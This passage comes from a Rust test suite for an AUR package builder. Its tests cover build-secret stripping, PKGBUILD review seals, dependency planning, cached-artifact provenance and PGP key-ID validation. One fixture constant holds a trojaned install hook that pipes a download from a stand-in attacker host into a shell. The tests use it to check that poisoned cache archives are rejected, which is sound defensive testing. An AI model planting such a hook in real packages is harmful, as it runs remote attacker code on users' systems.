        let first_review = REVIEW_LOCK.lock().await;
        let mut queued_review = tokio::spawn(async { REVIEW_LOCK.lock().await });
        tokio::task::yield_now().await;

        assert!(
            tokio::time::timeout(Duration::from_millis(50), &mut queued_review)
                .await
                .is_err(),
            "a second PKGBUILD review entered while the first still owned the terminal"
        );

        drop(first_review);
        let _queued_guard = tokio::time::timeout(Duration::from_secs(1), queued_review)
            .await
            .expect("queued review should enter after the first completes")
            .expect("queued review task should complete");
    }

    #[tokio::test]
    async fn build_environment_drops_inherited_secrets() {
        let home = tempfile::tempdir().expect("temporary build home");
        let mut command = Command::new("/usr/bin/env");
        command.env("OMG_TEST_SECRET", "must-not-leak");
        configure_build_environment(&mut command, home.path(), "builder");

        let output = command.output().await.expect("run env probe");
        assert!(output.status.success());
        let environment = String::from_utf8(output.stdout).expect("environment must be UTF-8");
        assert!(environment.contains(&format!("HOME={}", home.path().display())));
        assert!(environment.contains("USER=builder"));
        assert!(environment.contains("PATH=/usr/local/sbin:/usr/local/bin:/usr/bin"));
        assert!(
            !environment.contains("OMG_TEST_SECRET"),
            "untrusted builds must not inherit caller credentials: {environment}"
        );
    }

    #[tokio::test]
    async fn quiet_build_output_is_fully_written_to_the_log() {
        let temp = tempfile::tempdir().expect("temporary log directory");
        let log_path = temp.path().join("build.log");
        let log = tokio::fs::File::create(&log_path)
            .await
            .expect("create build log");
        let log = Arc::new(tokio::sync::Mutex::new(log));
        let (mut writer, reader) = tokio::io::duplex(128);

        writer
            .write_all(b"compiler output\n")
            .await
            .expect("write fake compiler output");
        writer.shutdown().await.expect("close fake compiler output");

        Box::pin(drain_build_output(
            reader,
            Arc::clone(&log),
            BuildOutputStream::Stdout,
            false,
        ))
        .await
        .expect("drain output");
        log.lock().await.flush().await.expect("flush build log");

        assert_eq!(
            tokio::fs::read_to_string(log_path)
                .await
                .expect("read build log"),
            "compiler output\n"
        );
    }

    #[test]
    fn reviewed_pkgbuild_digest_rejects_changed_bytes() {
        let directory = tempfile::tempdir().expect("temporary build directory");
        let path = directory.path().join("PKGBUILD");
        let reviewed = b"pkgname=example\npkgver=1\n";
        std::fs::write(&path, reviewed).expect("write reviewed PKGBUILD");
        let digest = pkgbuild_digest(reviewed);

        verify_reviewed_pkgbuild(&path, &digest).expect("unchanged PKGBUILD must match");
        std::fs::write(&path, b"pkgname=other\npkgver=1\n").expect("replace PKGBUILD");
        let error = verify_reviewed_pkgbuild(&path, &digest)
            .expect_err("changed PKGBUILD must fail its review seal");
        assert!(error.to_string().contains("changed after review"));
    }

    #[test]
    fn no_makepkg_invocation_can_install_dependencies() {
        let client = AurClient::new().expect("test settings must load");
        for args in [client.makepkg_args(), client.makepkg_args_sandbox()] {
            assert!(
                !args.iter().any(|arg| matches!(*arg, "-s" | "--syncdeps")),
                "sourcing a PKGBUILD must never run with dependency-install privileges"
            );
        }
    }

    #[tokio::test]
    async fn dependency_plan_refuses_missing_srcinfo() {
        let directory = tempfile::tempdir().expect("temporary build directory");
        let client = AurClient {
            build_dir: directory.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let error = client
            .aur_dependency_plan(directory.path(), "example", &["example".to_string()])
            .await
            .expect_err("missing .SRCINFO must fail before PKGBUILD execution");
        assert!(error.to_string().contains("has no regular .SRCINFO"));
    }

    #[test]
    fn recursive_dependency_builds_reject_cycles() {
        let mut in_flight = AHashSet::from_iter(["root-package".to_string()]);

        let error = AurClient::enter_dependency_build(&mut in_flight, "root-package")
            .expect_err("an in-flight package must be rejected");

        assert!(error.to_string().contains("Circular AUR dependency"));
        AurClient::enter_dependency_build(&mut in_flight, "leaf-package")
            .expect("a new dependency should enter the build set");

        let base_marker = AurClient::package_base_marker("root-base");
        in_flight.insert(base_marker);
        let error = AurClient::enter_package_base(&mut in_flight, "root-base")
            .expect_err("a split output must not re-enter its package base");
        assert!(
            error
                .to_string()
                .contains("Circular AUR package-base dependency")
        );
    }

    #[test]
    fn rollback_worktrees_are_unique_for_the_same_package_base() {
        let first = AurClient::rollback_worktree_name("example");
        let second = AurClient::rollback_worktree_name("example");
        assert!(first.starts_with("example-"));
        assert!(second.starts_with("example-"));
        assert_ne!(first, second);
    }

    #[test]
    fn rollback_errors_do_not_contain_literal_escape_text() {
        let not_found = AurClient::historical_version_not_found_message("example", "1.0-1");
        assert!(!not_found.contains('\\'));

        let build_failed = AurClient::historical_build_failure_message(
            "example",
            "1.0-1",
            Path::new("/var/log/omg/example.log"),
        );
        assert!(build_failed.contains('\n'));
        assert!(!build_failed.contains("\\n"));
        assert!(!build_failed.contains("\\\\"));
    }

    #[tokio::test]
    async fn package_base_file_locks_live_under_the_build_directory() {
        let directory = tempfile::tempdir().unwrap();
        let client = AurClient {
            build_dir: directory.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };

        let guard = client
            .acquire_package_base_file_lock("shared-base")
            .await
            .expect("package-base file lock");

        assert!(directory.path().join("_locks/shared-base.lock").is_file());
        drop(guard);
    }

    #[test]
    fn cloned_clients_serialize_work_for_the_same_package_base() {
        let directory = tempfile::tempdir().unwrap();
        let client = AurClient {
            build_dir: directory.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let cloned = client.clone();

        let first = client.package_base_lock("shared-base");
        let second = cloned.package_base_lock("shared-base");
        let unrelated = cloned.package_base_lock("unrelated-base");
        assert!(Arc::ptr_eq(&first, &second));
        assert!(!Arc::ptr_eq(&first, &unrelated));

        let guard = first.try_lock().expect("first package-base lock");
        assert!(second.try_lock().is_err());
        assert!(unrelated.try_lock().is_ok());
        drop(guard);
        assert!(second.try_lock().is_ok());
    }

    #[test]
    fn sandbox_cache_mounts_include_configured_compiler_caches() {
        let directory = tempfile::tempdir().unwrap();
        let cache_base = directory.path().join("cache");
        let ccache = cache_base.join("ccache");
        let sccache = cache_base.join("sccache");
        std::fs::create_dir_all(&ccache).unwrap();
        std::fs::create_dir_all(&sccache).unwrap();

        let mounts = AurClient::sandbox_cache_mounts(&cache_base, &[ccache, sccache]).unwrap();

        assert_eq!(
            mounts,
            vec![cache_base.join("ccache"), cache_base.join("sccache")]
        );

        let outside = directory.path().join("outside");
        std::fs::create_dir(&outside).unwrap();
        assert!(AurClient::sandbox_cache_mounts(&cache_base, &[outside]).is_err());
    }

    #[tokio::test]
    async fn test_makepkg_env_sanitization() {
        let client = AurClient::new().expect("test settings must load");
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = dir.path().join("mypkg");
        std::fs::create_dir(&pkg_dir).expect("pkg dir");

        let env = client
            .makepkg_env(&pkg_dir)
            .await
            .expect("makepkg env must be constructed");
        assert!(
            env.builddir.starts_with(paths::cache_dir()),
            "build dir must live under the omg cache directory, got {}",
            env.builddir.display()
        );
        assert!(
            !env.builddir.starts_with(std::env::temp_dir()),
            "build dir must never be under world-writable /tmp, got {}",
            env.builddir.display()
        );
        assert!(
            env.builddir.ends_with("mypkg"),
            "build dir must be named after the package, got {}",
            env.builddir.display()
        );
    }

    #[test]
    fn cache_key_allows_missing_srcinfo() {
        let client = AurClient::new().expect("test settings must load");
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = dir.path().join("mypkg");
        std::fs::create_dir(&pkg_dir).expect("pkg dir");
        std::fs::write(pkg_dir.join("PKGBUILD"), "pkgname=mypkg\n").expect("pkgbuild");

        client
            .cache_key(&pkg_dir, "")
            .expect("missing .SRCINFO is allowed");
    }

    #[test]
    fn cache_key_fails_when_srcinfo_is_unreadable() {
        use std::os::unix::fs::PermissionsExt;

        let client = AurClient::new().expect("test settings must load");
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = dir.path().join("mypkg");
        std::fs::create_dir(&pkg_dir).expect("pkg dir");
        std::fs::write(pkg_dir.join("PKGBUILD"), "pkgname=mypkg\n").expect("pkgbuild");
        let srcinfo = pkg_dir.join(".SRCINFO");
        std::fs::write(&srcinfo, "pkgbase = mypkg\n").expect("srcinfo");
        let mut permissions = std::fs::metadata(&srcinfo)
            .expect("srcinfo metadata")
            .permissions();
        permissions.set_mode(0o000);
        std::fs::set_permissions(&srcinfo, permissions).expect("chmod");

        let result = client.cache_key(&pkg_dir, "");
        let unreadable = std::fs::read(&srcinfo).is_err();

        let mut restore = std::fs::metadata(&srcinfo)
            .expect("srcinfo metadata")
            .permissions();
        restore.set_mode(0o644);
        std::fs::set_permissions(&srcinfo, restore).expect("restore chmod");

        if unreadable {
            result.expect_err("unreadable .SRCINFO must fail closed");
        }
    }

    #[test]
    fn srcinfo_version_extracts_pkgver_pkgrel() {
        let srcinfo = "pkgbase = postgresql18\n\
             pkgver = 18.4\n\
             pkgrel = 1\n\
             pkgdesc = PostgreSQL\n\
             \n\
             pkgname = postgresql18\n";
        assert_eq!(
            AurClient::srcinfo_version(srcinfo).as_deref(),
            Some("18.4-1")
        );
        // First occurrences win over later split-package duplicates.
        let dup = "pkgver = 1.0\npkgrel = 2\npkgname = a\npkgver = 9.9\n";
        assert_eq!(AurClient::srcinfo_version(dup).as_deref(), Some("1.0-2"));
        assert_eq!(AurClient::srcinfo_version("pkgname = x"), None);
        // makepkg emits epoch after pkgver/pkgrel in the pkgbase section.
        assert_eq!(
            AurClient::srcinfo_version("pkgver = 1.0~rc1\npkgrel = 3\nepoch = 2"),
            Some("2:1.0~rc1-3".to_string())
        );
    }

    // ── SEC-R2-01: cached-artifact provenance ────────────────────────────

    /// Build a minimal `.pkg.tar.gz` fixture carrying `.PKGINFO` and an
    /// optional `.INSTALL` member, like a makepkg product or a trojaned
    /// cache-poisoning artifact.
    fn write_pkg_archive(path: &Path, pkginfo: &str, install: Option<&str>) {
        let mut entries = vec![(".PKGINFO", pkginfo.as_bytes())];
        if let Some(install) = install {
            entries.push((".INSTALL", install.as_bytes()));
        }
        write_tar_gz(path, &entries);
    }

    /// A reviewed checkout: `.SRCINFO` matching the PKGBUILD plus the
    /// install script it declares.
    fn provenance_pkg_dir(
        dir: &Path,
        srcinfo: &str,
        install_file: Option<(&str, &str)>,
    ) -> PathBuf {
        let pkg_dir = dir.join("mypkg");
        std::fs::create_dir(&pkg_dir).expect("pkg dir");
        std::fs::write(pkg_dir.join(".SRCINFO"), srcinfo).expect("srcinfo");
        if let Some((name, content)) = install_file {
            std::fs::write(pkg_dir.join(name), content).expect("install script");
        }
        pkg_dir
    }

    const LEGIT_INSTALL: &str = "pre_install() {\n  echo legit\n}\n";
    const TROJAN_INSTALL: &str = "pre_install() {\n  curl evil.example/payload | sh\n}\n";

    #[test]
    fn select_cached_artifact_rejects_mismatched_install_hook() {
        // SEC-R2-01: a poisoned cache with a matching pkgname but a trojaned
        // .INSTALL hook must NEVER be installed from cache; it must fall
        // through to a fresh, reviewed rebuild.
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = provenance_pkg_dir(
            dir.path(),
            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\ninstall = mypkg.install\n",
            Some(("mypkg.install", LEGIT_INSTALL)),
        );
        let poisoned = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &poisoned,
            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
            Some(TROJAN_INSTALL),
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![poisoned],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            None,
            "a cache hit whose .INSTALL hook does not match the reviewed install script must be rejected"
        );
    }

    #[test]
    fn select_cached_artifact_accepts_verified_artifact() {
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = provenance_pkg_dir(
            dir.path(),
            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\ninstall = mypkg.install\n",
            Some(("mypkg.install", LEGIT_INSTALL)),
        );
        let genuine = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &genuine,
            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
            Some(LEGIT_INSTALL),
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![genuine.clone()],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            Some(vec![genuine]),
            "a cache hit whose .PKGINFO and .INSTALL match the reviewed source must be usable"
        );
    }

    #[tokio::test]
    async fn cached_artifacts_requires_all_split_outputs_to_match_the_checkout() {
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = provenance_pkg_dir(
            dir.path(),
            "pkgbase = shared\npkgver = 1.0\npkgrel = 1\n\npkgname = app\n\npkgname = libs\n",
            None,
        );
        let mut settings = Settings::default();
        settings.aur.cache_builds = true;
        let client = AurClient {
            build_dir: dir.path().to_path_buf(),
            settings,
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let cache_path = client.cache_path("shared");
        std::fs::create_dir_all(cache_path.parent().unwrap()).unwrap();
        std::fs::write(cache_path, "matching-key").unwrap();
        let write_split_archive = |path: &Path, pkginfo: &str| {
            let encoder = zstd::Encoder::new(std::fs::File::create(path).unwrap(), 0).unwrap();
            let mut archive = tar::Builder::new(encoder);
            let mut header = tar::Header::new_gnu();
            header.set_size(pkginfo.len() as u64);
            header.set_cksum();
            archive
                .append_data(&mut header, ".PKGINFO", pkginfo.as_bytes())
                .unwrap();
            archive.into_inner().unwrap().finish().unwrap();
        };
        let app = dir.path().join("app-1.0-1-x86_64.pkg.tar.zst");
        let libs = dir.path().join("libs-1.0-1-x86_64.pkg.tar.zst");
        write_split_archive(&app, "pkgname = app\npkgver = 1.0-1\npkgbase = shared\n");
        write_split_archive(&libs, "pkgname = libs\npkgver = 1.0-1\npkgbase = shared\n");
        let outputs = ["app".to_string(), "libs".to_string()];

        assert_eq!(
            client
                .cached_artifacts("shared", &outputs, &pkg_dir, dir.path(), "matching-key")
                .await
                .unwrap(),
            Some(vec![app.clone(), libs.clone()]),
        );
        assert!(
            AurClient::select_cached_artifacts(
                vec![libs.clone(), app],
                &outputs,
                &pkg_dir,
                "shared"
            )
            .is_none(),
            "archives must correspond to their requested outputs in order",
        );
        assert!(
            AurClient::select_cached_artifacts(Vec::new(), &[], &pkg_dir, "shared").is_none(),
            "empty outputs must not be treated as a cache hit",
        );

        std::fs::remove_file(&libs).unwrap();
        assert!(
            client
                .cached_artifacts("shared", &outputs, &pkg_dir, dir.path(), "matching-key")
                .await
                .unwrap()
                .is_none(),
            "a missing split output must reject the whole cached build",
        );
        write_split_archive(&libs, "pkgname = libs\npkgver = 9.9-1\npkgbase = shared\n");
        assert!(
            client
                .cached_artifacts("shared", &outputs, &pkg_dir, dir.path(), "matching-key")
                .await
                .unwrap()
                .is_none(),
            "a matching hash and filename must not hide one poisoned split output",
        );
    }

    #[test]
    fn select_cached_artifact_rejects_undeclared_install_hook() {
        // No `install=` in the reviewed source: any embedded .INSTALL in the
        // cached artifact is attacker-supplied.
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = provenance_pkg_dir(
            dir.path(),
            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\n",
            None,
        );
        let poisoned = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &poisoned,
            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
            Some(TROJAN_INSTALL),
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![poisoned],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            None,
            "an undeclared .INSTALL hook in a cached artifact must be rejected"
        );
    }

    #[test]
    fn select_cached_artifact_rejects_pkginfo_identity_mismatch() {
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = provenance_pkg_dir(
            dir.path(),
            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\n",
            None,
        );
        let wrong_version = dir.path().join("mypkg-9.9-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &wrong_version,
            "pkgname = mypkg\npkgver = 9.9-1\npkgbase = mypkg\n",
            None,
        );
        let wrong_base = dir.path().join("evil-1.0-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &wrong_base,
            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = evil\n",
            None,
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![wrong_version],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            None,
            "a cache hit whose .PKGINFO version differs from the reviewed .SRCINFO must be rejected"
        );
        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![wrong_base],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            None,
            "a cache hit whose .PKGINFO pkgbase differs from the reviewed package base must be rejected"
        );
    }

    #[test]
    fn select_cached_artifact_fails_closed_without_srcinfo() {
        // Missing .SRCINFO means missing proof of provenance: fail closed.
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = dir.path().join("mypkg");
        std::fs::create_dir(&pkg_dir).expect("pkg dir");
        let archive = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
        write_pkg_archive(
            &archive,
            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
            None,
        );

        assert_eq!(
            AurClient::select_cached_artifacts(
                vec![archive],
                &["mypkg".to_string()],
                &pkg_dir,
                "mypkg"
            ),
            None,
            "provenance cannot be proven without .SRCINFO; must fail closed"
        );
    }

    #[test]
    fn install_plan_for_one_split_output_installs_only_that_output() {
        // `omg install postgresql18-libs` must build the shared base once but
        // install only the requested output, never its unrequested siblings.
        let response: AurResponse = serde_json::from_str(
            r#"{
                "results": [
                    {
                        "Name": "postgresql18-libs",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18"
                    },
                    {
                        "Name": "postgresql18",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18",
                        "Depends": ["postgresql18-libs>=18.4"]
                    }
                ]
            }"#,
        )
        .expect("valid AUR RPC fixture");
        let requested = vec!["postgresql18-libs".to_string()];

        let jobs = AurClient::build_jobs_from_package_info(&requested, &response.results)
            .expect("single-output build plan");

        assert_eq!(jobs.len(), 1);
        assert_eq!(jobs[0].package, "postgresql18");
        assert_eq!(jobs[0].outputs, vec!["postgresql18-libs".to_string()]);
    }

    #[test]
    fn update_build_jobs_include_cross_base_build_dependencies() {
        let response: AurResponse = serde_json::from_str(
            r#"{
                "results": [
                    {
                        "Name": "compiler-git",
                        "Version": "1.0-1",
                        "PackageBase": "compiler-git"
                    },
                    {
                        "Name": "application-git",
                        "Version": "1.0-1",
                        "PackageBase": "application-git",
                        "MakeDepends": ["compiler-git>=1.0"]
                    }
                ]
            }"#,
        )
        .expect("valid AUR RPC fixture");
        let requested = vec!["application-git".to_string(), "compiler-git".to_string()];

        let jobs = AurClient::build_jobs_from_package_info(&requested, &response.results)
            .expect("cross-base build plan");
        let application = jobs
            .iter()
            .find(|job| job.package == "application-git")
            .expect("application job");
        assert_eq!(application.dependencies, ["compiler-git"]);
    }

    #[test]
    fn update_build_jobs_group_split_packages_by_aur_package_base() {
        // AUR RPC v5 reports both PostgreSQL split outputs under one PackageBase.
        // Building the output name directly creates an empty/nonexistent checkout;
        // the shared package base must be built once and both installed outputs selected.
        let response: AurResponse = serde_json::from_str(
            r#"{
                "results": [
                    {
                        "Name": "postgresql18-libs",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18",
                        "Depends": ["krb5"]
                    },
                    {
                        "Name": "postgresql18",
                        "Version": "18.4-1",
                        "PackageBase": "postgresql18",
                        "Depends": ["postgresql18-libs>=18.4"]
                    }
                ]
            }"#,
        )
        .expect("valid AUR RPC fixture");
        let requested = vec!["postgresql18-libs".to_string(), "postgresql18".to_string()];

        let jobs = AurClient::build_jobs_from_package_info(&requested, &response.results)
            .expect("split-package build plan");

        assert_eq!(jobs.len(), 1);
        assert_eq!(jobs[0].package, "postgresql18");
        assert_eq!(
            jobs[0].outputs,
            vec!["postgresql18".to_string(), "postgresql18-libs".to_string()]
        );
        assert!(jobs[0].dependencies.is_empty());
    }

    #[test]
    fn test_chunk_aur_names_empty() {
        let names: Vec<String> = vec![];
        let chunks = AurClient::chunk_aur_names(&names);
        assert_eq!(chunks.len(), 0, "Empty input should produce zero chunks");
    }

    #[test]
    fn test_chunk_aur_names_single() {
        let names = vec!["firefox".to_string()];
        let chunks = AurClient::chunk_aur_names(&names);
        assert_eq!(chunks.len(), 1, "Single package should produce one chunk");
        assert_eq!(chunks[0].len(), 1);
        assert_eq!(chunks[0][0], "firefox");
    }

    #[test]
    fn test_chunk_aur_names_boundary() {
        let mut names = Vec::new();

        // URL boundary calculation: Each package adds "&arg[]=".len() (7) + name.len()
        // Base: "https://aur.archlinux.org/rpc?v=5&type=info" = 47 chars
        // Available: 4400 - 47 = 4353 chars. With 20-char names: 4353 / 27 ≈ 161 packages/chunk
        for i in 0..200 {
            names.push(format!("package-name-{i:04}"));
        }

        let chunks = AurClient::chunk_aur_names(&names);

        for (idx, chunk) in chunks.iter().enumerate() {
            let mut url_len = AUR_RPC_INFO_BASE_LEN;
            for name in chunk {
                url_len += "&arg[]=".len() + urlencoding::encode(name).len();
            }
            assert!(
                url_len <= AUR_RPC_MAX_URI,
                "Chunk {idx} has URL length {url_len} which exceeds max {AUR_RPC_MAX_URI}"
            );
        }

        let total_packages: usize = chunks.iter().map(Vec::len).sum();
        assert_eq!(
            total_packages, 200,
            "All packages must be included in chunks"
        );
    }

    #[test]
    fn test_chunk_aur_names_long_package_names() {
        let names = vec![
            "a".repeat(100),
            "b".repeat(150),
            "c".repeat(200),
            "short".to_string(),
        ];

        let chunks = AurClient::chunk_aur_names(&names);

        for chunk in &chunks {
            let mut url_len = AUR_RPC_INFO_BASE_LEN;
            for name in chunk {
                url_len += "&arg[]=".len() + urlencoding::encode(name).len();
            }
            assert!(url_len <= AUR_RPC_MAX_URI);
        }

        let total: usize = chunks.iter().map(Vec::len).sum();
        assert_eq!(total, 4);
    }

    #[test]
    fn chunk_aur_names_accounts_for_percent_encoding() {
        let names = (0..220)
            .map(|index| format!("package+variant+{index:04}"))
            .collect::<Vec<_>>();

        let chunks = AurClient::chunk_aur_names(&names);
        assert!(chunks.len() > 1, "encoded request must be split");
        for chunk in chunks {
            let url_len = chunk.iter().fold(AUR_RPC_INFO_BASE_LEN, |length, name| {
                length + "&arg[]=".len() + urlencoding::encode(name).len()
            });
            assert!(url_len <= AUR_RPC_MAX_URI, "wire URI length was {url_len}");
        }
    }

    #[test]
    fn test_chunk_aur_names_exactly_at_boundary() {
        let available = AUR_RPC_MAX_URI - AUR_RPC_INFO_BASE_LEN;

        // Formula: arg_size = "&arg[]=".len() + pkg_name.len() = 7 + 10 = 17 chars/pkg
        let arg_size = "&arg[]=".len() + 10;
        let count = available / arg_size;

        let names: Vec<String> = (0..count).map(|i| format!("pkg{i:06}")).collect();
        let chunks = AurClient::chunk_aur_names(&names);

        assert_eq!(chunks.len(), 1, "Should fit exactly in one chunk");
        assert_eq!(chunks[0].len(), count);
    }

    #[test]
    fn test_has_word_boundary_match_start() {
        assert!(has_word_boundary_match("firefox-bin", "firefox"));
        assert!(has_word_boundary_match("firefox", "firefox"));
    }

    #[test]
    fn test_has_word_boundary_match_after_separator() {
        assert!(has_word_boundary_match("visual-studio-code", "studio"));
        assert!(has_word_boundary_match("lib_test_util", "test"));
        assert!(has_word_boundary_match("package.name", "name"));
    }

    #[test]
    fn test_has_word_boundary_match_no_match_substring() {
        assert!(!has_word_boundary_match("firefox-bin", "irefox"));
        assert!(!has_word_boundary_match("libtest", "test"));
        assert!(!has_word_boundary_match("mypackage", "pack"));
    }

    #[test]
    fn test_has_word_boundary_match_empty() {
        assert!(has_word_boundary_match("firefox", ""));
        assert!(!has_word_boundary_match("", "firefox"));
        assert!(has_word_boundary_match("", ""));
    }

    #[test]
    fn test_has_word_boundary_match_case_sensitive() {
        assert!(has_word_boundary_match("Firefox-Bin", "Firefox"));
        assert!(!has_word_boundary_match("firefox-bin", "Firefox"));
    }

    // ────────────────────────────────────────────────────────────────────────
    // PGP Key ID Validation Tests
    // ────────────────────────────────────────────────────────────────────────

    #[test]
    fn test_pgp_key_id_full_fingerprint() {
        // 40-char fingerprint - most secure
        let fingerprint = "ABCDEF1234567890ABCDEF1234567890ABCDEF12";
        assert_eq!(
            validate_pgp_key_id(fingerprint),
            PgpKeyIdStatus::FullFingerprint
        );
    }

    #[test]
    fn test_pgp_key_id_long_key_id() {
        // 16-char long key ID - acceptable
        let long_id = "ABCDEF1234567890";
        assert_eq!(validate_pgp_key_id(long_id), PgpKeyIdStatus::LongKeyId);
    }

    #[test]
    fn test_pgp_key_id_short_key_id_rejected() {
        // 8-char short key ID - VULNERABLE to collision attacks
        let short_id = "ABCDEF12";
        assert_eq!(validate_pgp_key_id(short_id), PgpKeyIdStatus::ShortKeyId);
    }

    #[test]
    fn test_pgp_key_id_very_short_rejected() {
        // Any ID < 16 chars is treated as short (vulnerable)
        assert_eq!(validate_pgp_key_id("ABCDEF"), PgpKeyIdStatus::ShortKeyId);
        assert_eq!(validate_pgp_key_id("AB"), PgpKeyIdStatus::ShortKeyId);
    }

    #[test]
    fn test_pgp_key_id_empty() {
        assert_eq!(validate_pgp_key_id(""), PgpKeyIdStatus::Empty);
    }

    #[test]
    fn test_pgp_key_id_too_long() {
        // More than 64 chars is invalid
        let too_long = "A".repeat(65);
        assert_eq!(validate_pgp_key_id(&too_long), PgpKeyIdStatus::TooLong);
    }

    #[test]
    fn test_pgp_key_id_boundary_64_chars_is_not_too_long() {
        // Exactly 64 hex chars must pass the length limit and fall through to
        // the non-standard-length classification (not be rejected as TooLong).
        let max_hex = "A".repeat(64);
        assert_eq!(
            validate_pgp_key_id(&max_hex),
            PgpKeyIdStatus::NonStandardLength
        );
    }

    #[test]
    fn test_pgp_key_id_invalid_chars() {
        // Non-hexadecimal characters
        assert_eq!(
            validate_pgp_key_id("GHIJKL1234567890"),
            PgpKeyIdStatus::InvalidChars
        );
        assert_eq!(
            validate_pgp_key_id("ABCDEF12!@#$%^&*"),
            PgpKeyIdStatus::InvalidChars
        );
    }

    #[test]
    fn test_pgp_key_id_non_standard_length() {
        // Valid hex but non-standard length (e.g., 20 chars)
        let non_standard = "ABCDEF1234567890ABCD";
        assert_eq!(
            validate_pgp_key_id(non_standard),
            PgpKeyIdStatus::NonStandardLength
        );
    }

    #[test]
    fn test_pgp_key_id_lowercase_hex() {
        // Lowercase hex should be valid (a-f)
        let lowercase = "abcdef1234567890";
        assert_eq!(validate_pgp_key_id(lowercase), PgpKeyIdStatus::LongKeyId);
    }

    #[test]
    fn test_pgp_key_id_mixed_case() {
        // Mixed case should be valid
        let mixed = "AbCdEf1234567890";
        assert_eq!(validate_pgp_key_id(mixed), PgpKeyIdStatus::LongKeyId);
    }

    #[test]
    fn require_fetchable_pgp_key_id_accepts_long_and_fingerprint() {
        require_fetchable_pgp_key_id("ABCDEF1234567890").expect("long key id");
        require_fetchable_pgp_key_id("ABCDEF1234567890ABCDEF1234567890ABCDEF12")
            .expect("fingerprint");
    }

    #[test]
    fn require_fetchable_pgp_key_id_rejects_short_and_invalid() {
        let short = require_fetchable_pgp_key_id("ABCDEF12")
            .expect_err("short key ids must not be skipped");
        assert!(
            short.to_string().contains("short PGP key ID"),
            "got: {short}"
        );
        let invalid = require_fetchable_pgp_key_id("GHIJKL1234567890")
            .expect_err("non-hex key ids must not be skipped");
        assert!(
            invalid.to_string().contains("non-hex chars"),
            "got: {invalid}"
        );
    }

    #[cfg(feature = "pgp")]
    #[test]
    fn package_scoped_pgp_home_contains_public_keys_without_secret_material() {
        use crate::core::security::keyserver;

        if which::which("gpg").is_err() {
            return;
        }
        let source_home = tempfile::tempdir().unwrap();
        let cache_dir = tempfile::tempdir().unwrap();
        let identity = format!(
            "OMG scoped keyring test {} <test@example.invalid>",
            uuid::Uuid::new_v4()
        );
        let generated = std::process::Command::new("gpg")
            .args([
                "--no-options",
                "--batch",
                "--pinentry-mode",
                "loopback",
                "--passphrase",
                "",
                "--homedir",
            ])
            .arg(source_home.path())
            .args(["--quick-generate-key", &identity, "ed25519", "sign", "1d"])
            .output()
            .unwrap();
        assert!(
            generated.status.success(),
            "{}",
            String::from_utf8_lossy(&generated.stderr)
        );
        let listing = std::process::Command::new("gpg")
            .args([
                "--no-options",
                "--batch",
                "--with-colons",
                "--fingerprint",
                "--homedir",
            ])
            .arg(source_home.path())
            .args(["--list-keys", &identity])
            .output()
            .unwrap();
        let fingerprint = String::from_utf8_lossy(&listing.stdout)
            .lines()
            .find_map(|line| {
                let fields: Vec<_> = line.split(':').collect();
                (fields.first() == Some(&"fpr"))
                    .then(|| fields.get(9).copied())
                    .flatten()
            })
            .expect("generated key fingerprint")
            .to_string();

        let scoped = create_scoped_pgp_home(
            std::slice::from_ref(&fingerprint),
            source_home.path(),
            cache_dir.path(),
        )
        .unwrap();
        assert!(keyserver::is_key_in_gnupg(&fingerprint, scoped.path()).unwrap());
        let secrets = std::process::Command::new("gpg")
            .args(["--no-options", "--batch", "--with-colons", "--homedir"])
            .arg(scoped.path())
            .arg("--list-secret-keys")
            .output()
            .unwrap();
        assert!(
            !String::from_utf8_lossy(&secrets.stdout)
                .lines()
                .any(|line| line.starts_with("sec:")),
            "package-scoped keyrings must not expose the user's secret keys"
        );
    }

    #[test]
    fn aur_pull_overrides_user_rebase_configuration() {
        let temp = tempfile::tempdir().unwrap();
        let remote = temp.path().join("remote.git");
        let seed = temp.path().join("seed");
        let checkout = temp.path().join("checkout");

        let git = |args: &[&std::ffi::OsStr]| {
